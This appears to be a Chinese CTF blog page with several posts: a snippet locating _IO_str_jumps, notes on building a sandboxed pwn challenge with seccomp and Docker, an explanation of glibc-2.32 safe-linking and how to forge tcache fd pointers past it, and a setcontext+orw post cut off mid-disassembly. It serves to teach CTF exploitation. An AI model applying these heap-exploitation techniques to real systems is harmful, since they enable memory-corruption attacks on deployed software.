<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">IO_str_jumps = libc_base + possible_IO_str_jumps_offset</span><br></pre></td></tr></table></figure>

<p>手动找方法也同理，先查看<code>_IO_str_underflow</code>函数的地址，再看哪里存有其地址，最后找到那个比<code>_IO_file_jumps</code>大的地址就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_IO_str_underflow</span><br><span class="line">$10 = (&lt;text variable, no debug info&gt; *) 0x7ffff7a89c30 &lt;__GI__IO_str_underflow&gt;</span><br><span class="line">gdb-peda$ search -p 0x7ffff7a89c30</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d07, halting search.</span><br><span class="line">libc-2.23.so    0x7ffff7dd0400 0x7ffff7a89c30</span><br><span class="line">libc-2.23.so    0x7ffff7dd04c0 0x7ffff7a89c30</span><br><span class="line">libc-2.23.so    0x7ffff7dd07c0 0x7ffff7a89c30</span><br><span class="line">libc-2.23.so    0x7ffff7dd0980 0x7ffff7a89c30</span><br><span class="line">gdb-peda$ p &amp;_IO_file_jumps</span><br><span class="line">$11 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">gdb-peda$ x/32gx 0x7ffff7dd07c0</span><br><span class="line">0x7ffff7dd07c0 &lt;_IO_str_jumps+32&gt;:	0x00007ffff7a89c30	0x00007ffff7a88610</span><br><span class="line">0x7ffff7dd07d0 &lt;_IO_str_jumps+48&gt;:	0x00007ffff7a89f90	0x00007ffff7a88640</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/03/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/03/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">出题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-06-03 18:07:46" itemprop="dateCreated datePublished" datetime="2022-06-03T18:07:46+08:00">2022-06-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-15 17:04:28" itemprop="dateModified" datetime="2022-06-15T17:04:28+08:00">2022-06-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="保护全开的编译命令"><a href="#保护全开的编译命令" class="headerlink" title="保护全开的编译命令"></a>保护全开的编译命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z now -pie -fPIE binary.c</span><br></pre></td></tr></table></figure>

<p>这条命令开启了pie跟FULL RELRO，因为NX跟canary默认是开的，所以这样就行了</p>
<h3 id="去除符号表"><a href="#去除符号表" class="headerlink" title="去除符号表"></a>去除符号表</h3><p>直接用strip就可以，要注意题目不要patch过</p>
<p><code>strip 题目名</code></p>
<h3 id="如果要加沙箱的话"><a href="#如果要加沙箱的话" class="headerlink" title="如果要加沙箱的话"></a>如果要加沙箱的话</h3><p>比较详细的文章：<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/78105.html">Seccomp从0到1</a></p>
<p>一般来说能用seccomp或者prctl函数来加沙箱，但是用seccomp的话会留下堆的使用痕迹，所以在堆题中一般只用prctl</p>
<p>下面这块的效果是禁用execve，如果这样就够了的话直接复制就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<h3 id="Docker部分"><a href="#Docker部分" class="headerlink" title="Docker部分"></a>Docker部分</h3><p>创建一个文件夹用来存放相关文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── flag.txt</span><br><span class="line">│   └── pwn</span><br><span class="line">├── build.sh</span><br><span class="line">├── ctf.xinetd</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── run.sh</span><br><span class="line">└── start.sh</span><br></pre></td></tr></table></figure>

<p>目前还不会自己写Dockerfile，所以用的是学长给的Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:21.04</span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line">RUN sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;s/security.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y openssh-server &amp;&amp; apt-get install -y openssh-client &amp;&amp; apt-get install -y net-tools &amp;&amp; rm -rf /var/lib/apt/lists/ &amp;&amp; rm -rf /root/.cache &amp;&amp; apt-get autoclean &amp;&amp; rm -rf /tmp/* /var/lib/apt/* /var/cache/* /var/log/*</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /lib* /home/ctf &amp;&amp; \</span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    mkdir /home/ctf/pwn &amp;&amp; \</span><br><span class="line">    mkdir /home/ctf/etc &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /usr/bin/whoami /home/ctf/bin/  &amp;&amp;\</span><br><span class="line">    cp /etc/passwd /home/ctf/etc/</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/flag.txt /home/ctf/</span><br><span class="line">COPY ./bin/pwn /home/ctf/pwn/</span><br><span class="line"></span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf/pwn/ &amp;&amp; \</span><br><span class="line">    chmod 770 /home/ctf/pwn/pwn &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag.txt &amp;&amp; \</span><br><span class="line">    echo &quot;ctf:123456&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></table></figure>

<p>将第一句<code>FROM ubuntu:21.04</code>中的ubuntu版本改成自己需要的就行，第一个<code>RUN</code>中进行了换源以及一些所需工具的安装，有时候要是报错的话可能是那个版本的ubuntu的问题，比如20.10这个版本好像就比较难找到能用的源</p>
<p>最后一行<code>EXPOSE 8888</code>将题目挂到了docker的8888端口</p>
<p>start.sh中的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Add your startup script</span><br><span class="line">service ssh start</span><br><span class="line"># DO NOT DELETE</span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line">sleep infinity;</span><br></pre></td></tr></table></figure>

<p>然后<code>ctf.xinetd</code>的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 8888</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./pwn/pwn</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source	= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu	= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Dockerfile相同目录下用这个命令生成一个镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t $NAME .</span><br></pre></td></tr></table></figure>

<p>然后用这个命令生成一个容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-add LINUX_IMMUTABLE -it -d -p &quot;0.0.0.0:3359:8888&quot; $NAME</span><br></pre></td></tr></table></figure>

<p>其中<code>-p &quot;0.0.0.0:3359:8888&quot;</code>的作用是端口映射，表示将docker的8888端口映射到本机3359端口中，这样就能用本机的ip:3359访问到docker的8888端口了，也就是题目</p>
<p>有时发现用127.0.0.1可以访问题目，但是用公网ip无法访问的话可能是服务器的安全组策略配置问题，也就是你的服务器开放了哪些端口。</p>
<p>文件夹里的<code>build.sh</code>和<code>run.sh</code>其实也就是上面两条命令</p>
<p>因为在提交题目时还需要提交镜像文件，所以要把生成的镜像打包一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o $NAME.tar $NAME</span><br></pre></td></tr></table></figure>

<p>顺带一提，用镜像tar压缩包生成镜像的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i $NAME.tar</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/31/glibc-2-32/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/31/glibc-2-32/" class="post-title-link" itemprop="url">glibc-2.32</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-05-31 17:22:54 / 修改时间：18:29:38" itemprop="dateCreated datePublished" datetime="2022-05-31T17:22:54+08:00">2022-05-31</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Safe-Linking"><a href="#Safe-Linking" class="headerlink" title="Safe-Linking"></a>Safe-Linking</h3><p>从glibc-2.32开始，将chunk放入tcache的函数（tcache_put）如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其第八行使用了一个宏<code>PROTECT_PTR</code>来对当前要放入tcache的chunk的fd指针进行了一个异或操作，该宏如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>

<p>其实很简单，<code>&amp;e-&gt;next</code>就是当前chunk的fd指针的地址，<code>tcache-&gt;entries[tc_idx]</code>中保存的是对应tcache bin的链表头。</p>
<p>将fd指针的地址右移12位然后跟tcache bin链表头进行异或，将所得值放到chunk的fd处。</p>
<p>而在从tcache bin中取出chunk的时候，只需要对其fd再进行一次异或即可得到原来的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该宏如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>也就是取fd的地址右移12位，再跟fd的值进行异或。</p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);	<span class="comment">//chunk1</span></span><br><span class="line">	<span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);	<span class="comment">//chunk2</span></span><br><span class="line">	<span class="built_in">free</span>(ptr1);</span><br><span class="line">	<span class="built_in">free</span>(ptr2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上poc中，free掉chunk1之后，tcache bin如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  1]: 0x6022a0 ◂— 0x602</span><br></pre></td></tr></table></figure>

<p>那么在chunk1入bin的过程中，<code>&amp;e-&gt;next == 0x6022a0</code>，<code>tcache-&gt;entries[tc_idx] == 0</code>，那么异或的结果就是0x602</p>
<p>再free掉chunk2，tcache bin如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  2]: 0x6022f0 —▸ 0x6024a2 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>那么在chunk2入bin的过程中，<code>&amp;e-&gt;next == 0x6022f0</code>，<code>tcache-&gt;entries[tc_idx] == 0x6022a0</code>，那么异或的结果就是0x6024a2</p>
<p>此时这两个chunk中的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602290</span><br><span class="line">0x602290:	0x0000000000000000	0x0000000000000051		//chunk1</span><br><span class="line">0x6022a0:	0x0000000000000602	0x0000000000602010</span><br><span class="line">0x6022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022e0:	0x0000000000000000	0x0000000000000051		//chunk2</span><br><span class="line">0x6022f0:	0x00000000006024a2	0x0000000000602010</span><br><span class="line">0x602300:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这导致了两个问题：</p>
<ol>
<li>我们直接泄漏tcache bin chunk的fd指针的话，泄漏出来的是进行异或操作后的数据</li>
<li>从tcache取出chunk时，会将该chunk的fd进行异或后再设置成链表头，所以我们伪造的fd就需要先将目标地址跟<code>&amp;fd &gt;&gt; 12</code>异或一次。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/21/setcontext-orw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/21/setcontext-orw/" class="post-title-link" itemprop="url">setcontext+orw</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-21 18:58:36" itemprop="dateCreated datePublished" datetime="2022-05-21T18:58:36+08:00">2022-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-24 07:42:05" itemprop="dateModified" datetime="2022-05-24T07:42:05+08:00">2022-05-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="堆题的orw"><a href="#堆题的orw" class="headerlink" title="堆题的orw"></a>堆题的orw</h3><p>在一道堆题里我们想要完成orw的操作就需要我们控制两个东西：sp指针跟ip指针。为此我们就可以利用setcontext</p>
<h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>首先这是个libc里的函数，需要用到它是因为它里面存在一些我们所需要的gadget，总的来说其实跟ret2csu差不多。</p>
<p>这个函数的利用大概可以以glibc-2.29为分界线，这是因为在glibc-2.29及之后我们所用到的gadget变成以rdx为索引。以glibc-2.30为例，它长这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000058000 ; __unwind &#123;</span><br><span class="line">.text:0000000000058000                 endbr64</span><br><span class="line">.text:0000000000058004                 push    rdi</span><br><span class="line">.text:0000000000058005                 lea     rsi, [rdi+128h] ; nset</span><br><span class="line">.text:000000000005800C                 xor     edx, edx        ; oset</span><br><span class="line">.text:000000000005800E                 mov     edi, 2          ; how</span><br><span class="line">.text:0000000000058013                 mov     r10d, 8         ; sigsetsize</span><br><span 